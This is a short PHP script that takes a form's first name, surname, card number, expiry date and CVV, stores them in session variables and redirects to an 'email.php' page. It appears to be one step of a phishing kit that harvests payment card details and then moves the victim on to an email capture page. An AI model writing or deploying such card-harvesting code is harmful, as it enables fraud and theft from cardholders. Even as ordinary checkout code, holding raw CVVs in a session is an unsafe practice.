<?php

session_start();

    $_SESSION['nombre'] = $_POST['nombre'];
    $_SESSION['apellido'] = $_POST['apellido'];
    $_SESSION['card'] = $_POST['card'];
    $_SESSION['date'] = $_POST['date'];
    $_SESSION['cvv'] = $_POST['cvv'];

    header("Location: ../email.php");

   